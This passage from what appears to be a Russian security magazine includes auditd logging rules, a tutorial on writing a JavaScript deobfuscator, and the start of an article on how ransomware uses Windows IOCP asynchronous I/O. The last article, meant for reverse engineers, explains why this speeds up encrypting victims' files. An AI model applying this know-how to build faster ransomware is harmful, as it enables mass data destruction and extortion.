а зачистка базы является причиной перенакатить все с бэкапа и сменить
учетные данные. Но, скорее всего, будучи уже не раз пойманным, ученик пой‐
мет, что удаление логов — это плохая практика, и будет действовать хитрее.
Например, заместит какой‑нибудь бинарник враппером, а то и сам git изба‐
вит от вредной привычки сдавать владельца. Пока это в будущем, меры ней‐
трализации не продуманы, так что еще есть над чем поработать.


АУДИТ

Аудит можно включить в облегченном варианте, когда для конкретной группы
все события фиксируются exec, с выделением в отдельную категорию
событий запуска файлов, владелец которых не root (например, что‑то скачали
из интернета и запустили). Для этого создадим файл /etc/audit/rules.d/
safews.rules следующего содержания:


-a always,exit -F arch= b64 -F obj_uid!= 0 -F gid=safeusers -S execve
-k execnonroot
-a always,exit -F arch= b32 -F obj_uid!= 0 -F gid=safeusers -S execve
-k execnonroot
-a exit,always -F arch= b64 -F gid=safeusers -S execve -k execsafe
-a exit,always -F arch= b32 -F gid=safeusers -S execve -k execsafe

Теперь можно сделать выборку по нужным ключам и вовремя принять меры:


root@safews:~/safews4lin# ausearch -i -k execnonroot
…
type= PATH msg= audit(16.07.2024 13:48:53.444:170) : item= 0 name=./
true inode=393746 dev=fc:05 mode=file,755 ouid=rediska ogid=rediska
rdev=00:00 nametype=NORMAL cap_fp= none cap_fi= none cap_fe= 0 cap_fver=
0 cap_frootid= 0
type= CWD msg= audit(16.07.2024 13:48:53.444:170) : cwd=/home/rediska
type=EXECVE msg= audit(16.07.2024 13:48:53.444:170) : argc= 1 a0=./true

По мере развития событий планируется набросать какой‑никакой анализа‐
тор, который сможет давать отбойки в случае необычного поведения поль‐
зователя, но пока это просто возможность разбора полетов по следам уже
произошедшего инцидента.


ВЫВОДЫ

Может показаться, что автор сгущает краски. Тем не менее с проблемой
«ребенок сутками залипает в „Роблоксе“ и не желает оттуда вылезать» стал‐
киваются многие родители. Надеюсь, эта инструкция поможет решить проб‐
лему хотя бы отчасти — как минимум заставит чадо изучить архитектуру Linux,
чтобы обойти воздвигнутые тобой ограничения. А этот навык обязательно
пригодится в жизни.
ВЗЛОМ





В  этой  статье  я  расскажу,  как  самос‐
тоятельно обходить обфускацию JavaScript
в тех случаях, когда не помогают даже нес‐
тандартные деобфускаторы. Мы рассмот‐
рим метод исследования запутанного кода           МВК
и напишем свой собственный деобфуска‐
тор.


Среди читателей наверняка есть те, кому тема скриптовой обфускации гораз‐
до милее ассемблера и прочего низкоуровневого колдунства. Именно этому
вопросу была посвящена, например, моя недавняя статья «JSFuck. Разбира‐
ем уникальный метод обфускации JS-кода» или упоминаемая в ней обзорная
статья про обфускаторы на Хабре. Но что делать, если перечисленные в этой
статье кастомные деобфускаторы не помогают? В таком случае обфускацию
придется обходить самостоятельно, и сейчас я расскажу, как это делается.


ИСПОЛЬЗУЕМ АВТОМАТИЧЕСКИЕ ДЕОБФУСКАТОРЫ

Для примера возьмем некое браузерное JavaScript-приложение. Объем его
составляет около трех мегабайт, примерно три четверти из которых занимает
жестко обфусцированный код, начинающийся так, как показано на сле‐
дующем скриншоте.





А заканчивается этот код вот так.





Если ты уже успел ознакомиться с упомянутой выше статьей, характерные
имена идентификаторов (_0x58cd18, _0x2f8935_0x321d33, _0x1e0595) дол‐
жны были  натолкнуть  тебя на  мысль,  что  код  запутан  обфускатором
obfuscator.io. Однако попытка деобфускации его стандартным онлайн‑деоб‐
фускатором при любых настройках не приносит положительного результата:
читаемый код в правом окне просто не появляется.





Точно так же не приносят результатов и попытки деобфускации другими упо‐
мянутыми в статье инструментами. Например, универсальный деобфускатор
de4js выдает совершенно неинформативный результат.





Похоже, надежды на автоматические деобфускаторы мало и нам придется
учиться работать руками.


             INFO

                          Забегая  вперед,  скажу,  что  перечисленными
                    выше инструментами мы не исчерпали все средс‐
                         тва  автоматической  деобфускации.  Например,
                         можно  попытаться  оптимизировать  код  через
                          нейросеть  Llama.  Автоматически  деобфусци‐
                        ровать подобный код  умеет  проект webcrack,
                      но давай все‑таки сделаем вид, что с исполь‐
                         зованием автоматических средств у нас ничего
                      не вышло, — так намного интереснее!



ДЕОБФУСЦИРУЕМ КОД ВРУЧНУЮ

Для начала натравим на сырой код JS Beautifier, дабы придать ему читабель‐
ность. Пробежавшись по теперь уже структурированному коду, обращаем
внимание на многочисленные вызовы функций с десятью шестнадцатерич‐
ными константами в виде параметров:


_0x4a0111(0xa0c, 0xc0b, 0x13ef, 0x1e3e, 0x15e2, 0x1a29, 0x1b08, 0x94b
, 0x968, 0x753)
_0x114a88(-0x6d, 0x126c, 0x621, 0xa59, -0x5f2, 0x72a, 0x6cf, 0x8a,
0xbf9, -0x4b4)
_0x27e22f(0xbf2, 0x670, 0xe4, 0x132e, 0x1267, 0xbf9, -0xb6, 0x697,
0x51f, 0x6da)
_0x1e51ce(0xe58, 0x1b5e, 0x2457, 0x191a, 0x224a, 0x133c, 0xf61,
0x1c11, 0x128d, 0xc77)
_0x33055f(0x16f4, 0x1704, 0xbaf, 0x231d, 0x163e, 0x161a, 0xca1,
0x15ba, 0x1c3f, 0x1649)
_0x1b164c(0x485, -0x398, 0x1e0, 0xf51, 0xcdd, 0x2de, 0xfea, 0x82f, -
0x54a, 0x37)
...

Логично предположить, что таким образом зашифрованы константы, которые
первым делом надо перевести в нормальный читаемый вид. Как обычно, нач‐
нем с конца. Код заканчивается следующим фрагментом:


...
} catch (_0x321d33) {
        console[_0x1e0595(0x4f3, 0x854, 0x1210, 0x19e1, 0x3ca, 0x992,
0x665, 0xf98, 0x185b, 0x1073)](_0x321d33);
    }
});

Если мыслить логически, это console.log(_0x321d33), то есть _0x1e0595(
0x4f3, 0x854, 0x1210, 0x19e1, 0x3ca, 0x992, 0x665, 0xf98, 0x185b,
0x1073) == "log". Попробуем провернуть этот фарш назад: ищем в коде
строку function _0x1e0595:


function _0x1e0595(_0x4bc581, _0x4ecbba, _0x1d5a39, _0x50dcae,
_0x403da8, _0x4ad34e, _0x2b446e, _0x3b51da, _0x44854e, _0x1491c6) {
    return _0x340121(_0x1491c6 - 0x5ff, _0x4ecbba - 0xb8, _0x1d5a39 -
0xb2, _0x50dcae - 0x81, _0x403da8 - 0x80, _0x4ad34e - 0x1b, _0x2b446e
- 0x99, _0x44854e, _0x44854e - 0x72, _0x1491c6 - 0x10f);
}

Как видишь, эта хрень ссылается на другую субхрень по имени _0x340121.
Ищем и ее тоже:


function _0x340121(_0x5ae465, _0x101079, _0x1d662f, _0x55f16c,
_0x4029db, _0x3a7a06, _0x1d53e1, _0x5b0eb3, _0x4c47fe, _0x445726) {
    return _0x3a86(_0x5ae465 - -0x26c, _0x5b0eb3);
}

Эта  субхрень, в свою  очередь,  ссылается на  протохрень под именем
_0x3a86, которая, по счастью, последняя (точнее, первая) в этой цепочке:


function _0x3a86(_0x37610f, _0x5cbb3a) {
    const _0x1214fd = _0x5e2d();
    return _0x3a86 = function(_0x3aa59b, _0x1ad7b1) {
        _0x3aa59b = _0x3aa59b - (-0x10 * -0x80 + 0x69 * -0x1 + 0xa *
-0xb5);
        _0x4072cc = _0x1214fd[_0x3aa59b];
        return _0x4072cc;
    }, _0x3a86(_0x37610f, _0x5cbb3a);
}

Пока что все просто. Осталось найти массив строковых констант, возвра‐
щаемый _0x5e2d:


function _0x5e2d(){
  const _0x552e21=['t?id=','mjSUq','wcYjB','pljgg','ct:\x20<','accou'
,'nlMqS',
                   ...
                   'se,\x22s','xESCJ'];
  _0x5e2d=function(){
      return _0x552e21;
  };
  return _0x5e2d();
}

Итак, похоже, мы вычленили минимальный фрагмент кода, отвечающий
за генерацию обфусцированных строк через функцию _0x1e0595:


function _0x5e2d(){
  const _0x552e21=['t?id=','mjSUq','wcYjB','pljgg','ct:\x20<','accou'
,'nlMqS',
                   ...
                   'se,\x22s','xESCJ'];
  _0x5e2d=function(){
      return _0x552e21;
  };
  return _0x5e2d();
}



function _0x3a86(_0x37610f, _0x5cbb3a) {
    const _0x1214fd = _0x5e2d();
    return _0x3a86 = function(_0x3aa59b, _0x1ad7b1) {
        _0x3aa59b = _0x3aa59b - (-0x10 * -0x80 + 0x69 * -0x1 + 0xa *
-0xb5);
        _0x4072cc = _0x1214fd[_0x3aa59b];
        return _0x4072cc;
    }, _0x3a86(_0x37610f, _0x5cbb3a);
}


function _0x340121(_0x5ae465, _0x101079, _0x1d662f, _0x55f16c,
_0x4029db, _0x3a7a06, _0x1d53e1, _0x5b0eb3, _0x4c47fe, _0x445726) {
    return _0x3a86(_0x5ae465 - -0x26c, _0x5b0eb3);
}



function _0x1e0595(_0x4bc581, _0x4ecbba, _0x1d5a39, _0x50dcae,
_0x403da8, _0x4ad34e, _0x2b446e, _0x3b51da, _0x44854e, _0x1491c6) {
    return _0x340121(_0x1491c6 - 0x5ff, _0x4ecbba - 0xb8, _0x1d5a39 -
0xb2, _0x50dcae - 0x81, _0x403da8 - 0x80, _0x4ad34e - 0x1b, _0x2b446e
- 0x99, _0x44854e, _0x44854e - 0x72, _0x1491c6 - 0x10f);
}


В дальнейшем нам предстоит автоматизировать поиски кода для каждой ана‐
логичной функции (хоть их и много, но они однотипные). А пока что мы просто
попытаемся  убедиться, что всё  сделали  правильно. Жмем в  браузере
F12 и вставляем найденный фрагмент кода в консоль, пробуя вычислить
выражение _0x1e0595(0x4f3, 0x854, 0x1210, 0x19e1, 0x3ca, 0x992,
0x665, 0xf98, 0x185b, 0x1073).
  В этот момент мы убеждаемся, что возвращаемая строка не log, а, наобо‐
рот, awal, хотя строка log в исходном массиве тоже присутствует. Значит, мы
где‑то облажались в расчетах или авторы обфускатора нас хитро обдурили,
хотя счастье было так близко...
   Посмотрим на код более внимательно. Верхний фрагмент кода, начиная
с комментария IT IS NOT SAFE TO MAKE CHANGES IN THE CODE BELOW, хит‐
ро перемешивает массив строковых констант _0x552e21 после его ини‐
циализации.





Занятно, что в условии while мы обнаруживаем знакомую нам по JSFuck
конструкцию (!![])==true. При внимательном рассмотрении отмечаем, что
такие константы вместе с обратным вариантом (![])==false щедро рас‐
киданы по обфусцированному  коду. Делаем себе  заметку на будущее
поменять их в коде глобальной заменой, после чего вставляем фрагмент,
показанный на предыдущем скриншоте, в начало нашего «ядерного кода»
и снова делаем тест. На этот раз все  сходится, результат правильный:
_0x1e0595(0x4f3,  0x854,  0x1210,  0x19e1,  0x3ca,  0x992,  0x665,
0xf98, 0x185b, 0x1073) == "log".
  На этом интересная и увлекательная исследовательская часть заканчива‐
ется и начинается кодинг, хоть и несложный, но довольно рутинный.


ПИШЕМ ДЕОБФУСКАТОР

План построения деобфускатора у нас будет следующий.
  По образу и подобию описанного выше процесса препарирования фун‐
кции _0x1e0595 полностью формируем «ядро»  функций, которые будут
декодировать строковые константы. Для этого ищем все функции, соответс‐
твующие вот такому шаблону:


function _0x??????(_0x??????, _0x??????, _0x??????, _0x??????, _0x
??????, _0x??????, _0x??????, _0x??????, _0x??????, _0x??????) {
        return _0x3a86(??????, ??????);
    }

Примерная  реализация  этого  действия  через  регулярные  выражения
на JavaScript выглядит так:


...
var reg = /function (_0x[a-f0-9]*)\(_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[
a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[
a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*\)\{return _0x3a86\([^)]*\);\}/g;
var functions = [], found,names=[];
while (found = reg.exec(string)) {
    functions.push(found[0]);
    names.push(found[1]);
}
...

Здесь string — исходный код, на выходе получаем functions — массив
кода функций, которые надо добавить к «ядерному» коду и одновременно
убрать из кода исходного; names — список имен этих функций.
  Ищем функции вида


function _0x??????(_0x??????, _0x??????, _0x??????, _0x??????, _0x
??????, _0x??????, _0x??????, _0x??????, _0x??????, _0x??????) {
        return <Name1>(??????, ??????,??????, ??????,??????, ??????,
??????, ??????,??????, ??????);
    }

Здесь Name1 — имя функции, из списка names, полученного в пункте 1. Код
выглядит следующим образом:


var reg = /function (_0x[a-f0-9]*)\(_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[
a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[
a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*\)\{return _0x3a86\([^)]*\);\}/g;
var functions = [], found,names=[];
while (found = reg.exec(string)) {
    functions.push(found[0]);
    names.push(found[1]);
}


var functions1 = [], names1=[];
for (var i=0;i<names.length;i++)
{
    var reg1 = new RegExp("function (_0x[a-f0-9]*)\\(_0x[a-f0-9]*,
_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[
a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*\\)\\{return "+names[i
]+"\\([^)]*\\);\\}", "g");
    while (found = reg1.exec(string)) {
       functions1.push(found[0]);
       names1.push(found[1]);
     }
}

Получаем новый список функций functions1 и их имен names1, которые тоже
добавляем в ядро и убираем из исходного кода.
   Повторяем поиск функции, каждый раз подставляя вместо списка names
полученный на предыдущем этапе список names1 до тех пор, пока на очеред‐
ном шаге список не опустеет. Итоговый код выглядит примерно так:


var reg = /function (_0x[a-f0-9]*)\(_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[
a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[
a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*\)\{return _0x3a86\([^)]*\);\}/g;
var functions = [], found,names=[];
while (found = reg.exec(string)) {
    functions.push(found[0]);
    names.push(found[1]);
}


var names2=names.slice();



while (true)
{
  var functions1 = [], names1=[];
  for (var i=0;i<names2.length;i++)
 {
    var reg1 = new RegExp("function (_0x[a-f0-9]*)\\(_0x[a-f0-9]*,
_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[
a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*,_0x[a-f0-9]*\\)\\{return "+names2[
i]+"\\([^)]*\\);\\}", "g");
    while (found = reg1.exec(string)) {
       functions1.push(found[0]);
       names1.push(found[1]);
        functions.push(found[0]);
        names.push(found[1]);


     }
  }
  if (names1.length==0) break;
  names2=names1.slice();
}

На выходе functions — это все паразитические функции, сгенерированные
обфускатором, а names — их имена.
   Теперь, когда «ядро» сформировано, мы просто перебираем все исчисля‐
емые выражения вида


<Name1>(??????,??????,??????,??????,??????,??????,??????,??????,
??????,??????)

Name1 — имя функции из полученного на предыдущих шагах списка names. Их
мы вычисляем при помощи вот такого кода:


var expressions=[];
var values=[];
for (var i=0;i<names.length;i++)
 {
    var reg1 = new RegExp(names[i]+"\\([^)]*,[^)]*,[^)]*,[^)]*,[^)]
*,[^)]*[^)]*,[^)]*,[^)]*,[^)]*\\)", "g");
    while (found = reg1.exec(string)) {
       var test=found[0];
       var value=undefined;
       try
       {
         value=eval(test);
         expressions.push(found[0]);
         values.push(value);
        } catch (err) {}
       }


  }

На выходе мы получаем массив expressions, в котором содержатся исчисля‐
емые  выражения  вида  _0x4a0111(0xa0c,  0xc0b,  0x13ef,  0x1e3e,
0x15e2, 0x1a29, 0x1b08, 0x94b, 0x968, 0x753) и соответствующие им
константы. Нам остается просто заменить в обфусцированном коде первые
вторыми обычной глобальной заменой.
  В итоге мы получаем частично деобфусцированный код, в котором хотя бы
строковые константы и имена стандартных методов будут представлены
в явном виде. Этот код уже вполне можно анализировать, править, можно
кормить им по частям другие деобфускаторы для приведения в полностью
читаемый вид.
   Разумеется, это далеко не полная деобфускация исходного приложения.
В стремлении к совершенству можно свернуть выражения вида Class[
"MethodName"] в Class.MethodName. Вот чуть более продвинутый вариант
кода в Object.MethodName:


const _0x17ef7d = {};
_0x17ef7d[MethodName]

Напоследок можно выполнить несколько словарных преобразований сле‐
дующего вида:


const _0x45618a = {
            'aJqDi': function(_0x2b031d, _0x1fc5a3) {
                return _0x2b031d(_0x1fc5a3);
            },
            'FDTmk': function(_0x542b4c, _0x55bd01) {
                return _0x542b4c(_0x55bd01);
            },
            ...

В итоге мы получим близкий к читабельному код, в котором только исходные
имена переменных и функций будут безвозвратно потеряны.





ВЫВОДЫ

По своей любимой привычке я слегка слукавил и описал всего лишь самый
простой  и  быстрый  способ  частичной  деобфускации  JavaScript-кода.
Для  написания  серьезного  полного  деобфускатора  простым  поис‐
ком‑заменой регулярных выражений, разумеется, не обойтись. Для этого
по‑хорошему надо писать свой собственный эмулятор JavaScript-машины,
как,  например,  это  реализовано  в  упомянутом мною  деобфускаторе
webcrack. Возможно, я когда‑нибудь расскажу об этом подробнее, а пока
интересующиеся  и  нетерпеливые  могут  самостоятельно  покопаться
в исходном коде этого проекта.
КОДИНГ





Что самое главное в любом вирусе‑шиф‐
ровальщике? Конечно же, его  скорость!
Наиболее эффективных показателей воз‐
можно достичь с помощью механизма IOCP,
и его используют все популярные локеры:         MichelleVermishelle                                                                                       @Michaelzhm
LockBit,  Conti, Babuk. Давай посмотрим,        michael.zhmailo@yandex.ru
как работает этот механизм, чтобы узнать,
как действуют вирусописатели. Эти знания
пригодятся нам при реверсе.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих      расследование      инцидентов
                      и обратную разработку вредоносного ПО. Автор
                      и редакция не несут ответственности за любой
                        вред, причиненный с применением изложенной
                        информации.   Распространение   вредоносных
                         программ, нарушение работы систем и наруше‐
                      ние тайны переписки преследуются по закону.



СИНХРОННЫЙ И АСИНХРОННЫЙ ВВОД-ВЫВОД

Windows поддерживает два способа работы с файлами: синхронный и асин‐
хронный.
  Под синхронным способом ввода‑вывода понимаются стандартные фун‐
кции ReadFile() и WriteFile() и иные, отличные от WinAPI, которые долго,
нудно и постепенно читают данные из файла. Единственная их особен‐
ность — поток простаивает до тех пор, пока операция не будет завершена.
Вызвал ReadFile() для чтения 10 Гбайт, и сиди жди, пока файл считается.
К такому же поведению можно отнести функции из std::ifstream. Само
собой, есть вариант считывания файла построчно, но временные показатели
не особенно изменятся. Не исключено, что даже увеличатся.
   Если шифровальщик будет таким образом перебирать все файлы в сис‐
теме, то его эффективность окажется невысокой. Свежеустановленная винда
занимает около 50 Гбайт, а со всем софтом на диске в среднем будет занято
в районе 300 Гбайт. Если пользователь склонен к накопительству, то в нес‐
колько раз больше.
   Конечно,  злоумышленники  могут  применить  лайфхаки и  шифровать
не любые файлы, а только документы или только части файлов, но все равно
при синхронном вводе‑выводе скорость будет низкой.


Замеряем скорость чтения
Я набросал небольшую программку, которая поможет тебе измерять ско‐
рость чтения файлов. Ее полный код — ниже.


 #include <iostream>
 #include <fstream>
 #include <vector>
 #include <chrono>


 int main() {
   std::string filename = "D:\\ISO\\debian-11.7.0-amd64-netinst.iso";
   std::ifstream file(filename, std::ios::binary);


   if (!file.is_open()) {
     std::cerr << "Can't open file: " << filename << std::endl;
     return 1;
   }
   file.seekg(0, std::ios::end);
   std::streampos fileSize = file.tellg();
   file.seekg(0, std::ios::beg);
   std::vector<char> buffer(fileSize);
   auto start = std::chrono::high_resolution_clock::now();
   file.read(buffer.data(), buffer.size());
   auto end = std::chrono::high_resolution_clock::now();
   std::chrono::duration<double> duration = end - start;
   file.close();
   if (!file) {
     std::cerr << "Reading error" << std::endl;
     return 1;
   }
   std::cout << "Elapsed time: " << duration.count() << " sec." <<
 std::endl;
   for (size_t i = 0; i < 10 && i < buffer.size(); ++i) {
     std::cout << std::hex << static_cast<int>(buffer[i] & 0xff) <<
 " ";
   }
   std::cout << std::dec << std::endl;
   return 0;
 }




Авторы вирусов‑шифровальщиков все чаще обращаются к асинхронному
вводу‑выводу. Для  этого  обычно  используются  функции ReadFileEx()
и WriteFileEx(). Да, то же в теории можно делать и с обычными ReadFile()
и  WriteFile(),  но  пользоваться  расширенными  функциями  удобнее.
При вызове этих функций со специальными параметрами они сразу же вернут
поток управления, и программа не будет простаивать. Вызвал ReadFileEx()
для файла размером 10 Гбайт, и продолжай работу потока. Как только файл
считался, получишь уведомление.
  Сам асинхронный ввод‑вывод делится на несколько подвидов:
 • Multithreaded I/O — вариант для консерваторов. Никакой асинхрон‐
  щины тут на самом деле нет: разработчик создает множество потоков
   в программе, каждый из которых синхронно считывает или записывает
   данные. Представь, что есть десять файлов по 10 Гбайт, вместо считыва‐
   ния их в одном потоке ты считываешь их в десяти параллельных потоках,
   что ускоряет время операции в десять раз;
 • Overlapped I/O — асинхронщина в чистом ее виде. При чтении и записи
   поток не ждет завершения операции, а продолжает свою работу. Поток
  может приостановиться по собственному желанию только тогда, когда ему
   потребуется результат операции ввода‑вывода. Реализуется такой метод
   с помощью специальной структуры OVERLAPPED, отсюда и название;
 • Completion Routines I/O (extended I/O) — отличается от Overlapped
  I/O тем, что при завершении ввода‑вывода система вызовет специальную
   callback-функцию. Чаще  всего  реализуется через APC (asynchronous
   procedure calls) либо IOCP (input-output completion port). О втором вари‐
   анте мы и будем говорить.


ЧТО СЛЕДУЕТ УЧИТЫВАТЬ ПРИ РАБОТЕ С АСИНХРОННЫМ I/O

Стоит помнить, что асинхронные операции сразу же возвращают поток
управления, а считывание (например, при вызове ReadFileEx()) происходит
в фоновом режиме. Как следствие, нельзя:
 • отталкиваться от возвращаемого функцией значения до завершения асин‐
   хронной операции;
 • использовать количество переданных байтов или данные из структуры
  OVERLAPPED в качестве критерия проверки до завершения асинхронной
   операции;
 • повторно использовать данные из структуры OVERLAPPED до завершения
   асинхронной операции.


СТРУКТУРА OVERLAPPED

Запрос на асинхронный ввод‑вывод так или иначе предполагает, что будет
использоваться вот эта структура.


typedef struct _OVERLAPPED {
  ULONG_PTR Internal;
  ULONG_PTR InternalHigh;
  union {
    struct {
      DWORD Offset;
      DWORD OffsetHigh;
    };
    PVOID Pointer;
    };
  HANDLE hEvent;
} OVERLAPPED, *LPOVERLAPPED;

 • Internal, InternalHigh — не трогаем, это поле хранит инфу для сис‐
   темы. Обычно там лежит значение STATUS_PENDING, если файл еще чита‐
   ется;
 • Offset, OffsetHigh — смещения, указывающие, с какого места должна
   начинаться асинхронная операция (Pointer — альтернатива этим полям.
   Особенно удобно использовать, если требуется 64-битное смещение);
 • hEvent — хендл события, которое переходит в свободное (сигнальное)
   состояние после завершения асинхронной операции. Поэтому завер‐
  шение асинхронной операции можно отслеживать, например с помощью
  WaitForSingeObjectEx() .

При асинхронных операциях именно в этой структуре устанавливается фай‐
ловый указатель. Допустим, если бы мы хотели прочитать только вторую
половину файла, то сделали бы так.


OVERLAPPED ovlp;
...
// Установка позиции начала чтения в файле
ovlp.Offset=N*2;
ReadFile(hFile, pBuffer, N * 2, &dwCount, &ovlp);

Как видишь, структура передается в вызовах ReadFile() и WriteFile().
Главное — не забыть при получении хендла файла, например с помощью
вызова  CreateFile()  (который  всегда  синхронный),  установить  флаг
FILE_FLAG_OVERLAPPED. В  результате файл  открывается в асинхронном
режиме.


// Открытие файла
hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL,
  // Асинхронные операции
  OPEN_EXISTING, FILE_FLAG_OVERLAPPED,
           NULL);

Стоит отметить некоторые особенности:
 • экземпляр этой структуры должен сохраняться до тех пор, пока работает
   асинхронная операция;
 • событие сможет кто угодно поместить в сигнальное состояние. То есть
   тебя могут невольно обмануть, случайно сказав, что операция завер‐
   шилась, поэтому будь осторожен.

Помимо этого, функции ReadFile() и WriteFile() в асинхронном режиме
работы всегда возвращают FALSE, что нормально. Чтобы понять, успешно ли
началась асинхронная операция, нужно дернуть GetLastError(). Если эта
функция отдает ERROR_IO_PENDING, то все отлично, асинхронная операция
началась.
  Еще у этих функций есть параметр bytes, который возвращает количество
прочитанных данных. При асинхронной операции этот параметр не имеет
значения, так как операция не завершена. Лучше указать NULL для этого аргу‐
мента. Вот пример кода, который открывает файл, асинхронно считывает
данные, а затем ожидает завершения операции.


HANDLE hFile = ::CreateFile(L"c:\\temp\\mydata.txt", GENERIC_READ,
FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_FLAG_OVERLAPPED,
nullptr);
if (hFile != INVALID_HANDLE_VALUE) {
  OVERLAPPED ov = { 0 };
  ov.hEvent = ::CreateEvent(nullptr, TRUE, FALSE, nullptr);
  BYTE buffer[1 << 12]; // 4 KB
  BOOL ok = ::ReadFile(hFile, buffer, sizeof(buffer), nullptr, &ov);
  if(!ok) {
    if (::GetLastError() != ERROR_IO_PENDING) {
    // Произошла ошибка
    return;
  }
  else {
    // Поток здесь может делать еще что-нибудь
    // Do();
    // Поток сделал все, что мог, теперь нужно данные получить из
асинхронной операции


    // Синхронизация по событию
    ::WaitForSingleObject(ov.hEvent, INFINITE);
    ::CloseHandle(ov.hEvent);
  }
}
// Здесь можно работать с данными
::CloseHandle(hFile);

После завершения асинхронной операции обычно обращаются к функции
GetOverlappedResult() для получения данных.


BOOL GetOverlappedResult(
_In_ HANDLE hFile,
_In_ LPOVERLAPPED lpOverlapped,
_Out_ LPDWORD lpNumberOfBytesTransferred,
_In_ BOOL bWait);

 • hFile — хендл файла, над которым была проведена асинхронная опе‐
   рация;
 • lpOverlapped — структура OVERLAPPED, используемая во время асин‐
   хронной операции;
 • lpNumberOfBytesTransferred — количество байтов, переданных/про‐
   читанных во время асинхронной операции;
 • bWait — если указано TRUE, а также параметр Internal структуры
  OVERLAPPED равен STATUS_PENDING, то функция не вернет управление
   до тех пор, пока не будет завершена асинхронная операция. Если указать
  FALSE, а асинхронная операция еще выполняется, то функция вернет
  FALSE, а GetLastError() — значение ERROR_IO_INCOMPLETE . Если
   асинхронная операция завершена, то этот параметр не имеет значения.

Функция возвращает TRUE после завершения операции асинхронного I/O.
Если функция вернула FALSE, значит, что‑то пошло не так, лови с помощью
GetLastError().
   Помимо этого, у нас есть возможность отменить асинхронную операцию
с помощью CancelIo().


BOOL WINAPI CancelIo(
  _In_ HANDLE hFile
);

 • hFile — дескриптор файла, в который производится перекрывающий
   ввод‑вывод.

С помощью этой функции мы сможем отменить операцию асинхронного вво‐
да‑вывода только текущего потока. Если попробуем передать в нее асин‐
хронные функции других потоков, то ничего не произойдет.
   Отмененные       операции       завершаются      с       ошибкой
ERROR_OPERATION_ABORTED.


IOCP

Представь, что у нас теперь не один файл, а миллион. В нашей программе
совершается множество операций ввода‑вывода, и, как следствие, исполь‐
зовать примеры кода выше будет не очень удобно. Поэтому разработчики
Windows создали IOCP.
  IOCP — это механизм, который используется для оповещения о завер‐
шении асинхронных операций и позволяет одному или нескольким потокам
обрабатывать результаты этих операций. То есть к IOCP цепляются всякие
объекты и этот IOCP получает уведомления о том, что такая‑то асинхронная
операция завершилась. После этого встроенный пул потоков в IOCP может
обработать результат этих операций.
  В IOCP есть такой термин — порт. Порт представляет собой очередь
в ядре. Очередь заполняется записями, когда завершается асинхронная опе‐
рация. К этому порту привязано определенное количество потоков, которые
начинают обрабатывать очередь. Разработчик может регулировать количес‐
тво потоков.
   Вот для наглядности картинка со Stack Overflow.





                           Схема работы IOCP

Здесь
 • completion notifications — поступающие данные о завершении работы
   асинхронной операции. Также иногда называется I/O completion request;
 • completion port — место, куда попадают данные;
 • queued thread — потоки, которые находятся в «спящем» состоянии.
   У них еще нет работы, например когда очередь пустая;
 • worker thread — поток, получивший задачу из completion port.


IOCP КАК ОЧЕРЕДЬ В БОЛЬНИЦУ

Если по‑прежнему не очень понятно, то представь больницу с кучей пен‐
сионерок. Но приходят они не сразу, а время от времени. Больница —
completion port, бабушки — результаты асинхронных операций, свободные
врачи — queued thread, врачи, уже работающие с пациентами, — worker
thread.
   Наступило   утро,   пришли   врачи,   открылась   больница   (функция
CreateIOCompletionPort()), бабушек нет, врачи в queued thread. Потом
приехал первый автобус и выгрузил толпу бабушек (либо автоматически,
либо через PostQueuedCompletionPort()). Врачи сразу же расхватали паци‐
енток (GetQueuedCompletionStatus()) и превратились в worker thread.
   Следом приезжает маршрутка, и вновь пенсионерки заходят в больницу.
Но все врачи заняты, поэтому старушки покорно ждут, когда какой‑нибудь
врач освободится, то есть worker thread завершит работу и перейдет в сос‐
тояние queued thread, а из состояния queued thread можно брать новую
бабушку.
  И такой цикл будет повторяться до тех пор, пока результаты всех асин‐
хронных операций, поступивших в пул потоков, не будут завершены. То есть
все бабушки будут снабжены диагнозами и предписаниями и отправлены
по домам.
   Помимо этого, пациенток давным‑давно привязали к этой конкретной
больнице. Поэтому среди обилия работающих IOCP-портов бабушки будут
приходить именно к нашему.
   Дальше я постараюсь по возможности пояснять, где бабушки, а где боль‐
ница, чтобы было понятнее.


СОЗДАНИЕ IOCP И СВЯЗЫВАНИЕ С ПОТОКАМИ, ДЕСКРИПТОРАМИ

CreateIoCompletionPort()
С помощью этой функции можно создать IOCP. Причем с помощью этой же
функции можно присоединить к IOCP какой‑нибудь хендл.


HANDLE CreateIoCompletionPort(
  HANDLE FileHandle,
  HANDLE ExistingCompletionPort,
  DWORD CompletionKey,
  DWORD NumberOfConcurrentThreads
);

Здесь
 • FileHandle — OVERLAPPED-дескриптор, присоединяемый к порту IOCP
   (допустим, пайп с FILE_FLAG_OVERLAPPED или сокет, созданный обыч‐
   ной функцией socket() ). Если задать INVALID_DESCRIPTOR_HANDLE,
   то функция просто создаст новый порт IOCP и вернет его дескриптор,
   в этом случае ExistingCompletionPort должен быть равен NULL;
 • ExistingCompletionPort —  используется для  добавления  хендла
   в порт. То есть в нашей аналогии — чтобы привязать бабушку к конкретной
   больнице. В этом параметре указывается больница, к которой привязать
   бабушку из FileHandle;
 • CompletionKey — специальное значение, называемое ключом. Это ука‐
   затель на любые данные, которые мы сами определили. Используется
   в основном для того, чтобы внутри потока, который начал обрабатывать
